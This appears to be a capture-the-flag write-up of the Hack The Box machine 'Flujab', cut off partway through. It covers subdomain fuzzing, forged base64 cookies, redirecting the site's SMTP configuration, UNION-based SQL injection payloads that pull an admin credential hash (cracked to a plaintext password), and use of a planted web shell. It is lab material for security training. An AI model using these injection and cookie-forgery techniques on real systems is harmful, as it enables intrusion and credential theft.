@@ -1,0 +1,1505 @@
+---
+layout: default
+title: Flujab
+---
+
+<h1>Flujab</h1>
+<p class="date">15/06/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/flujab.png">
+
+<p>Flujab is a tough box with plenty of rabbit holes and easter eggs, that makes it pretty fun. I got the root flag before the user flag and I'm not sure if it's the intended way but was really interesting anyway. To get an initial foothold, we'll have to enumerate different websites, play with a <code>smtp</code> service, exploit a <code>sqli</code> vulnerability and work with different endpoints to get information about the host files. Then, to gain a shell investigate <code>ssh</code> configurations and finally, use an exploit to escalate privileges.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#User">User & Root</a>
+</div>
+
+<hr>
+
+<h2 id="user">User & Root</h2>
+
+<p>First run nmap to see we have ports <code>22/ssh</code>, <code>80/http</code>, <code>443/https</code> and <code>8080/http</code> open.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# nmap -sC -sV 10.10.10.124
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-28 09:29 EDT
+Nmap scan report for 10.10.10.124
+Host is up (0.16s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE   VERSION
+22/tcp   open  ssh?
+80/tcp   open  http      ClownWare Proxy
+|_http-server-header: ClownWare Proxy
+|_http-title: Did not follow redirect to https://10.10.10.124/
+443/tcp  open  ssl/https ClownWare Proxy
+|_http-server-header: ClownWare Proxy
+|_http-title: Direct IP access not allowed | ClownWare
+| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK
+| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
+| Not valid before: 2018-11-28T14:57:03
+|_Not valid after:  2023-11-27T14:57:03
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+| tls-nextprotoneg: 
+|_  http/1.1
+8080/tcp open  ssl/http  nginx
+|_http-server-header: ClownWare Proxy
+|_http-title: Direct IP access not allowed | ClownWare
+| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK
+| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
+| Not valid before: 2018-11-28T14:57:03
+|_Not valid after:  2023-11-27T14:57:03
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+| tls-nextprotoneg: 
+|_  http/1.1
+</pre>
+
+<p>If we visit the website we'll see the following page that mimics a <code>CloudFare</code> error, but called <code>ClownWare</code> instead.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/1.png">
+
+<p>Looking at the <code>nmap</code> output we can see the ssl certificate has the following alternative names.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# cat names.txt 
+10.10.10.124
+clownware.htb
+proxy.clownware.htb
+console.flujab.htb
+sys.flujab.htb
+smtp.flujab.htb
+vaccine4flu.htb
+bestmedsupply.htb
+custoomercare.megabank.htb
+flowerzrus.htb
+chocolateriver.htb
+meetspinz.htb
+rubberlove.htb
+freeflujab.htb
+flujab.htb
+</pre>
+
+<p>Add them all to <code>/etc/hosts</code>.</p>
+
+<pre class="prettyprint">
+10.10.10.124	clownware.htb proxy.clownware.htb console.flujab.htb sys.flujab.htb smtp.flujab.htb vaccine4flu.htb bestmedsupply.htb custoomercare.megabank.htb flowerzrus.htb chocolateriver.htb meetspinz.htb rubberlove.htb freeflujab.htb flujab.htb
+</pre>
+
+<p>We can run <code>wfuzz</code> to replace the <code>Host</code> header with those names and see if we have a different output from the ClownWare error.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# wfuzz -c -w names.txt -u "https://10.10.10.124/" -H "Host:FUZZ" --hw 250
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.4 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://10.10.10.124/
+Total requests: 16
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000005:  C=200     22 L	      39 W	    519 Ch	  "console.flujab.htb"
+000007:  C=200    134 L	     433 W	   4954 Ch	  "smtp.flujab.htb"
+000008:  C=200     22 L	      35 W	    502 Ch	  "vaccine4flu.htb"
+000010:  C=200     22 L	      38 W	    521 Ch	  "custoomercare.megabank.htb"
+000011:  C=200     65 L	     321 W	   3480 Ch	  "flowerzrus.htb"
+000012:  C=200     21 L	      39 W	    491 Ch	  "chocolateriver.htb"
+000013:  C=200     22 L	      40 W	    522 Ch	  "meetspinz.htb"
+000014:  C=200     21 L	      39 W	    492 Ch	  "rubberlove.htb"
+000015:  C=200    139 L	     620 W	   8743 Ch	  "freeflujab.htb"
+000009:  C=200    402 L	    1385 W	  21051 Ch	  "bestmedsupply.htb"
+</pre>
+
+<p>In <code>console.flujab.htb</code> we have the following gif.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/console.gif">
+
+<p>In <code>smtp.flujab.htb</code> a SMTP Mail Configuration login panel.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/2.png">
+
+<p>In <code>vaccine4flu.htb</code> this gif.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/getvacc.gif">
+
+<p>In <code>custoomercare.megabank.htb</code> just this picture that mimics a Firefox error.</p> 
+
+<img class="img-fluid" src="/static/img/htb/flujab/warning.png">
+
+<p>In <code>flowerzrus.htb</code> what it seems to be a flower shop, but with no functionalities.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/3.png">
+
+<p>In <code>chocolateriver.htb</code> a video from the movie Charlie and the chocolate factory.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/4.png">
+
+<p>In <code>meetspinz.htb</code> this gif, not the popular meatspin unfortunately.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/meatspin.gif">
+
+<p>In <code>rubberlove.htb</code> a quite strange video.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/5.png">
+
+<p>In <code>freeflujab.htb</code> a website to raise awareness about getting the flu jab.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/6.png">
+
+<p>And finally, in <code>bestmedsupply.htb</code> a shop to buy pills, but those doesn't seem to prevent the flu.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/7.png">
+
+<p>If we try to visit any non-existent path we get redirected to <code>https://clownware.htb/cwerror_pages.php</code> where we have this pleasant picture.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/error.gif">
+
+<p>After a quick google search we can find <a href="https://pastebin.com/8N9DLrmf" target="_blank">this pastebin</a> with, what it seems to be, the steps to get root on the machine, but if you take a look on the date, it was uploaded on DEC 31ST, 2018 and the machine was released on 26 Jan 2019. Something strange.</p>
+
+<p>The pastebin says to check <code>https://custoomercare.megabank.htb/shell.php</code> where we have the following comment.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/8.png">
+
+<p>Looks like there's a hidden shell on <code>/shell</code>, so let's try <code>/shell.php?cmd=id</code></p>.
+
+<img class="img-fluid" src="/static/img/htb/flujab/9.png">
+
+<p>A shell as root! Pretty easy.</p>
+
+<p>Check what files do we have using <code>?cmd=ls -al</code>.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/10.png">
+
+<p>Read the root flag <code>?cmd=cat root.txt</code>.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/11.png">
+
+<p>Yep, one of the thousand "easter eggs" in flujab.</p>
+
+<p>Let's move forward, and after fuzzing all the sites we can find the following files (I'm sure I missed some).</p>
+
+<p>In <code>console.flujab.htb/x.php</code>, <code>bestmedsupply.htb/root.php</code> and <code>chocolateriver.htb/hack.php</code> we have the same comment as before.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/8.png">
+
+<p>In <code>flujab.htb/link.php</code> and <code>sys.flujab.htb/link.php</code> we have another nice clown.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/link.png">
+
+<p>In <code>smtp.flujab.htb/README</code> a note saying the service is no longer operational.</p>
+
+<pre class="prettyprint">
+   -------------------------------------
+   This Service has been decommissioned!
+   -------------------------------------
+
+Administrators can now use the configuration 
+section of the new free service application.
+</pre>
+
+<p>If we check any non-existent path in <code>freeflujab.htb</code> we get a binary file with the following content.</p>
+
+<pre class="prettyprint long">
+root@kali:~/htb/flujab# cat ffdf 
+&lt;?php 
+define('SafeIncludes', TRUE);
+require_once('includes/get_host.php');
+//                                                                                              /$$              
+include('includes/tokens.php');//                                                               | $$              
+//   /$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$   /$$$$$$$  /$$$$$$         /$$$$$$$  /$$$$$$   /$$$$$$$  /$$$$$$     
+//  /$$_____/ /$$__  $$| $$  | $$ /$$__  $$ /$$_____/ /$$__  $$       /$$_____/ /$$__  $$ /$$__  $$ /$$__  $$    
+// |  $$$$$$ | $$  \ $$| $$  | $$| $$  \__/| $$      | $$$$$$$$      | $$      | $$  \ $$| $$  | $$| $$$$$$$$    
+//  \____  $$| $$  | $$| $$  | $$| $$      | $$      | $$_____/      | $$      | $$  | $$| $$  | $$| $$_____/    
+//  /$$$$$$$/|  $$$$$$/|  $$$$$$/| $$      |  $$$$$$$|  $$$$$$$      |  $$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$    
+// |_______/  \______/  \______/ |__/       \_______/ \_______/       \_______/ \______/  \_______/ \_______/    
+include('includes/actions.php');                                                                                                              
+//                                                                                                    /$$ /$$ /$$
+include('includes/header.php');//                                                                    | $$| $$| $$
+//                    /$$   /$$  /$$$$$$  /$$   /$$ /$$   /$$ /$$   /$$ /$$   /$$  /$$$$$$   /$$$$$$ | $$| $$| $$
+//                   | $$  | $$ |____  $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$ /$$__  $$ /$$__  $$| $$| $$| $$
+//                   | $$  | $$  /$$$$$$$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$$$$$$$| $$$$$$$$|__/|__/|__/
+//                   | $$  | $$ /$$__  $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$_____/| $$_____/            
+//                   |  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$ /$$ /$$ /$$
+//                    \____  $$ \_______/ \____  $$ \____  $$ \____  $$ \____  $$ \_______/ \_______/|__/|__/|__/
+//                    /$$  | $$           /$$  | $$ /$$  | $$ /$$  | $$ /$$  | $$                                
+//                   |  $$$$$$/          |  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/                                
+//                    \______/            \______/  \______/  \______/  \______/                                 
+include('includes/scripts.php');
+//                                                  ▄▄▄▄▄▄▄▄▄▄▄        
+//                                             ▄▄▀▀▀▀          ▀▀▄▄    
+//                                           ▄▀                   ▀▀▄    
+//                                          █                        █
+//                                         █                     ▄▀▀▀▀▀█▄
+//                                        █▀                    █    ▄███
+//                                        █                     █    ▀███
+//                                        █     ▄▀▀██▀▄         █       █
+//                                        █    █  ████ █         ▀▄▄▄▄▄█ 
+//                                        █    █  ▀██▀ █               █
+//                                        █    █       █              ▄▀
+//                                        █    ▀▄     ▄▀  ▄▄▄▄▄▄▄▄▄   █  
+//                                        █     ▀▀▀▀▀    █  ▀  ▀  █  ▄▀ 
+//                                         █              ▀▄█▄█▄█▀ ▄▀
+//                                          █                     ▄▀    
+include('includes/path_handler.php');//      ▀▀▀▄          ▄▄▄▄▄▄▀▀
+//                                            ▄▀         ▀▀  ▄▀ 
+//                                          ▄▀               █
+//                                         ▄▀                █  ▄▀▀▀█▀▀▄
+//                                         █    █  █▀▀▀▄     █▀▀    █  █
+//                                        ▄█    ▀▀▀    █     █    ▀▀   █
+//                                        █▀▄          █      █▄       █
+//                                        █  ▀▀▀▀▀█▄▄▄▄▀       ▀█▀▀▀▄▄▄▀
+//                                        █                     █
+//                                        █                     █
+//                                        █                     █
+//                                         █         ▀▄  ▄▀    █
+//                                          █          █        ▀▄
+//                                           █         █          █
+//                                           █         █           ▀▄
+//                                           █      ▄▀▀█▀▀▄        ▄▀▀██▀▄ 
+//                                           █             █▀▄            █
+//                                           ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀  ▀ ▀▀▀▀▀▀▀▀▀▀▀
+include('includes/fortune.php');
+?>
+</pre>
+
+<p>The site <code>freeflujab.htb</code> seems the most promising, because seems to have more functionalities, so let's try to dig deeper.</p>
+
+<p>In the main page we can see the following cookies are being set.</p>
+
+<pre class="prettyprint">
+Set-Cookie: Modus=Q29uZmlndXJlPU51bGw%3D; expires=Fri, 03-May-2019 22:26:49 GMT; Max-Age=3600; path=/?smtp_config
+Set-Cookie: Patient=42e5300a33fff60f953037ad26510844; expires=Fri, 03-May-2019 22:26:49 GMT; Max-Age=3600; path=/
+Set-Cookie: Registered=NDJlNTMwMGEzM2ZmZjYwZjk1MzAzN2FkMjY1MTA4NDQ9TnVsbA%3D%3D; expires=Fri, 03-May-2019 22:26:49 GMT; Max-Age=3600; path=/
+</pre>
+
+<p>In the <code>Modus</code> cookie we have the path <code>/?smtp_config</code> and if we try to visit it, we will get redirected to <code>/?denied</code>.</p>
+
+<pre class="prettyprint">
+HTTP/1.1 302 Found
+Date: Fri, 03 May 2019 21:42:27 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Location: /?denied
+Server: ClownWare Proxy
+Content-Length: 2060
+</pre>
+
+<p>If we url decode the cookie value and then decode it using <code>base64</code> we get this.</p>
+
+<pre class="prettyprint">
+Q29uZmlndXJlPU51bGw%3D -> Q29uZmlndXJlPU51bGw= -> Configure=Null
+</pre>
+
+<p>We just have to change the value of Configure to True and replace the cookie.</p>
+
+<pre class="prettyprint">
+Configure=True -> Q29uZmlndXJlPVRydWU= -> Q29uZmlndXJlPVRydWU%3D
+</pre>
+
+<p>Then we should see the following site instead of <code>/?denied</code>.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/12.png">
+
+<p>If we try to put our IP we'll see there's a restriction on the input, but is done in the client side.</p>
+
+<pre class="prettyprint">
+&lt;input name="mailserver" id="email-server" value="smtp.flujab.htb" pattern="smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}" title=" A Valid SMTP Domain Address Is Required" type="text">
+</pre>
+
+<p>We just have to write any valid value like <code>smtp.caca.htb</code> and then replace it with our IP in burp for example.</p>
+
+<pre class="prettyprint">
+mailserver=smtp.caca.pipi&port=25&save=Save+Mail+Server+Config
+mailserver=10.10.16.89&port=25&save=Save+Mail+Server+Config
+</pre>
+
+<p>Now our IP has been whitelisted and has been configured as the mailserver, so let's run <code>smtpd</code> python module to see if we receive any email.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# python -m smtpd -n -c DebuggingServer 10.10.16.89:25
+</pre>
+
+<p>Meanwhile, after playing a bit with the site, we saw that all the paths look like <code>/?function</code>. We would run <code>wfuzz</code> checking how many words does the resulting page has to see if it's different, but we would see all requests get a different amount of words because there's a random generated comment at the end of the html code. Therefore, we're just gonna check if we get another status code besides <code>200</code>.</p> 
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# wfuzz -c -u https://freeflujab.htb/?FUZZ -w /usr/share/wordlists/dirb/common.txt --hc 200 -Z
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.4 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://freeflujab.htb/?FUZZ
+Total requests: 4614
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000286:  C=302    143 L	     696 W	   9147 Ch	  "admin"
+000994:  C=302    144 L	     686 W	   9112 Ch	  "config"
+001007:  C=302    147 L	     666 W	   9029 Ch	  "console"
+002347:  C=302    138 L	     619 W	   8752 Ch	  "login"
+002973:  C=302    139 L	     626 W	   8792 Ch	  "ping"
+003351:  C=302     46 L	      94 W	   2060 Ch	  "remind"
+003609:  C=302    143 L	     635 W	   8839 Ch	  "settings"
+</pre>
+
+<p>Visiting those paths will redirect us to:</p>
+<ul>
+<li>admin -> u_wish</li>
+<li>config -> gifnoc</li>
+<li>console -> SEGA</li>
+<li>login -> logout</li>
+<li>ping -> pong</li>
+<li>pong -> no_u_pong</li>
+<li>settings -> ohh_no_no_no</li>
+</ul>
+
+<p>All of them, just show the main page, so that didn't help much.</p>
+
+<p>I found I would get better results using the option <code>--hs</code> that hides responses that contain a specified regex. I used the text <i>Flu can be unpleasant</i> to filter those results that get you to the main page.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/flujab# wfuzz -c -u https://freeflujab.htb/?FUZZ -w /usr/share/wordlists/dirb/common.txt --hs "Flu can be unpleasant" -Z
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.4 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://freeflujab.htb/?FUZZ
+Total requests: 4614
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000673:  C=200    107 L	     328 W	   5203 Ch	  "book"
+002040:  C=200    346 L	    1388 W	  16839 Ch	  "info"
+003337:  C=200    108 L	     355 W	   5404 Ch	  "reg"
+003351:  C=302     46 L	      94 W	   2060 Ch	  "remind"
+003847:  C=200    301 L	    2810 W	  23540 Ch	  "stats"
+</pre>
+
+<p>Those links were already available on the site, but anyway. If we visit <code>/?remind</code> we get redirected again.</p>
+
+<pre class="prettyprint">
+HTTP/1.1 302 Found
+Date: Fri, 03 May 2019 22:14:32 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Set-Cookie: Modus=Q29uZmlndXJlPU51bGw%3D; expires=Fri, 03-May-2019 23:14:32 GMT; Max-Age=3600; path=/?smtp_config
+Location: /?ERROR=NOT_REGISTERED
+Server: ClownWare Proxy
+Content-Length: 2060
+</pre>
+
+<p>We just have to repeat the decode and encode process and replace the <code>Registered</code> cookie value with True.</p>
+
+<pre class="prettyprint">
+NDJlNTMwMGEzM2ZmZjYwZjk1MzAzN2FkMjY1MTA4NDQ9TnVsbA%3D%3D -> NDJlNTMwMGEzM2ZmZjYwZjk1MzAzN2FkMjY1MTA4NDQ9TnVsbA== -> 42e5300a33fff60f953037ad26510844=Null
+</pre>
+
+<pre class="prettyprint">
+42e5300a33fff60f953037ad26510844=True -> NDJlNTMwMGEzM2ZmZjYwZjk1MzAzN2FkMjY1MTA4NDQ9VHJ1ZQ=== -> NDJlNTMwMGEzM2ZmZjYwZjk1MzAzN2FkMjY1MTA4NDQ9VHJ1ZQ%3D%3D
+</pre>
+
+<p>Now we're allowed to see the reminder tab.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/13.png">
+
+<p>The same happens with <code>/?cancel</code> which is accessible through the top navigation panel.</p> 
+
+<img class="img-fluid" src="/static/img/htb/flujab/14.png">
+
+<p>If we put any NHS number like <code>NHS-012-345-6789</code> and click cancel we will receive the following mail on our <code>smtpd</code>.</p>
+
+<pre class="prettyprint">
+---------- MESSAGE FOLLOWS ----------
+Date: Fri, 3 May 2019 23:30:35 +0100
+To: cancelations@no-reply.flujab.htb
+From: Nurse Julie Walters &lt;DutyNurse@flujab.htb>
+Subject: Flu Jab Appointment - Ref:
+Message-ID: <960b93a5f98ffacc25834c774c5af0f2@freeflujab.htb>
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=iso-8859-1
+X-Peer: 10.10.10.124
+
+    CANCELLATION NOTICE!
+  ________________________
+    
+    VACCINATION
+    Routine Priority
+    ------------------
+    REF    : NHS-012-345-6789    
+    Code   : Influ-022
+    Type   : Injection
+    Stat   : CANCELED 
+    LOC    : Crick026 
+  ________________________
+
+  Your flu jab appointment has been canceled.
+  Have a nice day,
+
+  Nurse Julie Walters
+  Senior Staff Nurse
+  Cricklestone Doctors Surgery
+  NHS England.
+  
+
+------------ END MESSAGE ------------
+</pre>
+
+<p>Using <code>burp</code> we can modify the <code>nhsnum</code> parameter and put any value.</p>
+
+<p>After trying different payloads we can see there's a sqli vulnerability and we can make an union attack.</p>
+
+<pre class="prettyprint">
+nhsnum=' UNION SELECT 1,2,3,4,5;#&submit=Cancel+Appointment
+</pre>
+
+<p>On the generated mail we can see the subject contains the value of the third selected value on the union query.</p>
+
+<pre class="prettyprint">
+Subject: Flu Jab Appointment - Ref:3
+</pre>
+
+<p>Using <code>@@version</code> we can retrieve the type and version of database, here we're facing a <code>MariaDB</code>.</p>
+
+<pre class="prettyprint">
+nhsnum=' UNION SELECT 1,2,@@version,4,5;#&submit=Cancel+Appointment
+=>
+Subject: Flu Jab Appointment - Ref:10.1.37-MariaDB-0+deb9u1
+</pre>
+
+<p>The next step is list all the available databases.</p>
+
+<pre class="prettyprint">
+nhsnum=' UNION SELECT 1,2,group_concat(schema_name),4,5 FROM information_schema.schemata;#&submit=Cancel+Appointment
+=>
+Subject: Flu Jab Appointment - Ref:MedStaff,information_schema,mysql,openmrs,performance_schema,phplist,vaccinations
+</pre>
+
+<p>Listing the tables in the <code>vaccinations</code> database we can see the following tables.</p>
+
+<pre class="prettyprint">
+nhsnum=' UNION SELECT 1,2,group_concat(table_name),4,5 FROM information_schema.tables WHERE table_schema = 'vaccinations';#&submit=Cancel+Appointment
+=>
+Subject: Flu Jab Appointment - Ref:admin,admin_attribute,admin_password_request,adminattribute,admintoken,attachment,attribute,bounce,bounceregex,bounceregex_bounce,config,eventlog,i18n,linktrack,linktrack_forward,linktrack_ml,linktrack_uml_click,linktrack_userclick,list,listmessage,listuser,message,message_attachment,messagedata,sendprocess,subscribepage,subscribepage_data,template,templateimage,urlcache,user,user_attribute,user_blacklist,user_blacklist_data,user_history,user_message_bounce,user_message_forward,user_message_view,usermessage,userstats
+</pre>
+
+<p>The <code>admin</code> table looks promising, so let's take a look to its columns.</p>
+
+<pre class="prettyprint">
+nhsnum=' UNION SELECT 1,2,group_concat(column_name),4,5 FROM information_schema.columns WHERE table_name = 'admin';#&submit=Cancel+Appointment
+=>
+Subject: Flu Jab Appointment - Ref:id,loginname,namelc,email,created,modified,modifiedby,password,passwordchanged,superuser,disabled,privileges,id,loginname,namelc,email,access,created,modified,modifiedby,password,passwordchanged,superuser,disabled,privileges
+</pre>
+
+<p>We can't retrieve all the columns because of the length of the message, so we have to select just a couple each time. These are the important values.</p>
+
+<pre class="prettyprint">
+nhsnum=' UNION SELECT 1,2,group_concat(loginname, ';', password, ';', access),4,5 FROM admin;#&submit=Cancel+Appointment
+=>
+Subject: Flu Jab Appointment - Ref:sysadm;a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602;sysadmin-console-01.flujab.htb
+</pre>
+
+<p>We now have a username, a hashed password and a new domain name.</p>
+
+<p>Putting the hash in <a href="https://crackstation.net" target="_blank">crackstation</a> we can retrieve the password <code>th3doct0r</code>.</p>
+
+<p>Accessing to <code>sysadmin-console-01.flujab.htb</code> will send us to the same ClownFare error page, but if we remember our initial scan, we had another <code>nginx</code> running on port <code>8080</code>, going to <code>sysadmin-console-01.flujab.htb:8080</code> will give us the following login panel.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/15.png">
+
+<p><b>Note:</b> if you didn't do the steps above you won't be able to access, because your IP won't be whitelisted. To be whitelisted you just have to make the <code>smtp_config</code> request.</p>
+
+<p>Using the credentials we also had in the database (<code>sysadm/th3doct0r</code>) will give us the following dashboard.</p>
+
+<img class="img-fluid" src="/static/img/htb/flujab/16.png">
+
+<p>If we intercept the traffic while we play with the app, we should see a request is sent to <code>/api/filesystem/list//</code> when visiting the notepad. The response is the following, which seems to list all directories on <code>/</code>.</p>
+
+<pre class="prettyprint long">
+{
+    "items": [{
+        "isDir": true,
+        "name": "home",
+        "gid": 0,
+        "mode": 16877,
+        "mtime": 1543873511.0322936,
+        "path": "/home",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "usr",
+        "gid": 0,
+        "mode": 16877,
+        "mtime": 1543882244.1410491,
+        "path": "/usr",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "mnt",
+        "gid": 0,
+        "mode": 16877,
+        "mtime": 1543326356.765128,
+        "path": "/mnt",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "media",
+        "gid": 0,
+        "mode": 16877,
+        "mtime": 1543326345.649128,
+        "path": "/media",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "lost+found",
+        "gid": 0,
+        "mode": 16832,
+        "mtime": 1543326345.0,
+        "path": "/lost+found",
+        "size": 16384,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "share",
+        "gid": 0,
+        "mode": 16877,
+        "mtime": 1543368167.3924465,
+        "path": "/share",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "tmp",
+        "gid": 0,
+        "mode": 17407,
+        "mtime": 1557680761.875878,
+        "path": "/tmp",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "lib64",
+        "gid": 0,
+        "mode": 16877,
+        "mtime": 1543326365.429128,
+        "path": "/lib64",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "lib",
+        "gid": 0,
+        "mode": 16877,
+        "mtime": 1544021465.325739,
+        "path": "/lib",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "srv",
+        "gid": 0,
+        "mode": 16877,
+        "mtime": 1543326356.777128,
+        "path": "/srv",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "sys",
+        "gid": 0,
+        "mode": 16749,
+        "mtime": 1557669285.5,
+        "path": "/sys",
+        "size": 0,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "root",
+        "gid": 0,
+        "mode": 16832,
+        "mtime": 1545248773.3599997,
+        "path": "/root",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "run",
+        "gid": 0,
+        "mode": 16877,
+        "mtime": 1557680767.019878,
+        "path": "/run",
+        "size": 580,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "bin",
+        "gid": 0,
+        "mode": 16877,
+        "mtime": 1544026695.3867288,
+        "path": "/bin",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "proc",
+        "gid": 0,
+        "mode": 16749,
+        "mtime": 1557669283.056,
+        "path": "/proc",
+        "size": 0,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": false,
+        "name": "initrd.img.old",
+        "gid": 0,
+        "mode": 33188,
+        "mtime": 1543326441.537128,
+        "path": "/initrd.img.old",
+        "size": 18135502,
+        "isFile": true,
+        "isLink": true,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "etc",
+        "gid": 0,
+        "mode": 16877,
+        "mtime": 1544575795.688,
+        "path": "/etc",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "sbin",
+        "gid": 0,
+        "mode": 16877,
+        "mtime": 1543327313.4583015,
+        "path": "/sbin",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "var",
+        "gid": 0,
+        "mode": 16877,
+        "mtime": 1543326557.329128,
+        "path": "/var",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "boot",
+        "gid": 0,
+        "mode": 16877,
+        "mtime": 1543326590.585128,
+        "path": "/boot",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": true,
+        "name": "opt",
+        "gid": 0,
+        "mode": 16877,
+        "mtime": 1544022193.0367422,
+        "path": "/opt",
+        "size": 4096,
+        "isFile": false,
+        "isLink": false,
+        "uid": 0
+    }, {
+        "isDir": false,
+        "name": "vmlinuz",
+        "gid": 0,
+        "mode": 33188,
+        "mtime": 1540665976.0,
+        "path": "/vmlinuz",
+        "size": 4232992,
+        "isFile": true,
+        "isLink": true,
+        "uid": 0
+    }, {
+        "isDir": false,
+        "name": "initrd.img",
+        "gid": 0,
+        "mode": 33188,
+        "mtime": 1543326441.537128,
